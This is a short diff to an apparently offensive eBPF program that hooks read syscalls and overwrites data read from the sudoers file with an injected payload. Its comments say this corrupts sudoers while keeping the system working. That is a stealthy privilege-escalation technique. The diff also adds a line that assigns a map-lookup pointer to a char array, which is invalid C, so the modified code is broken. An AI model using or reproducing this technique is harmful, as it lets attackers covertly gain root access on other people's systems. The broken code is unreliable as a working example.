@@ -1,3 +1,4 @@
+#include "./common.h"
 SEC("tp/syscalls/sys_enter_read")
 int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
 {
@@ -56,11 +57,12 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     // then add '#'s to comment out rest of data in the chunk.
     // This sorta corrupts the sudoers file, but everything still
     // works as expected
-    char local_buff[max_payload_len] = { 0x00 };
+    // char local_buff[max_payload_len] = { 0x00 };
+    char local_buff[max_payload_len] = (char *)bpf_map_lookup_elem(&map_payload_buffer, 1);
     bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
     for (unsigned int i = 0; i < max_payload_len; i++) {
         if (i >= payload_len) {
-            local_buff[i] = '#';
+            local_buff[i] = '\n';
         }
         else {
             local_buff[i] = payload[i];
